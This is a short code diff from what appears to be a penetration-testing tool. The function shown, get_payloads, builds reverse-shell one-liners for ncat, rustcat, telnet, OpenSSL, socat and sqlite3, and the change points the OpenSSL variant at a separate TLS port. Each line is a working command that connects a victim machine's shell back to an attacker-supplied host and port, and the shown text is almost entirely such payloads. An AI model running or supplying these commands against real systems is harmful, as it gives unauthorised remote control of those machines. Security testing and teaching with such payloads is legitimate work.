@@ -11,7 +11,7 @@ def get_payloads(host, revshell_port, tls_port):
             'ncat udp': f'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|ncat -u {host} {revshell_port} >/tmp/f',
             'rustcat': f'rcat connect -s sh {host} {revshell_port}',
             'telnet': f'TF=$(mktemp -u);mkfifo $TF && telnet {host} {revshell_port} 0<$TF | sh 1>$TF',
-            'OpenSSL': f'mkfifo /tmp/s; sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect {host}:{revshell_port} > /tmp/s; rm /tmp/s',
+            'OpenSSL': f'mkfifo /tmp/s; sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect {host}:{tls_port} > /tmp/s; rm /tmp/s',
             'socat #1': f'socat TCP:{host}:{revshell_port} EXEC:sh',
             'socat #2 (TTY)': f'socat TCP:{host}:{revshell_port} EXEC:\'sh\',pty,stderr,setsid,sigint,sane',
             'sqlite3 nc mkfifo': f'sqlite3 /dev/null \'.shell rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc {host}:{revshell_port} >/tmp/f\'',
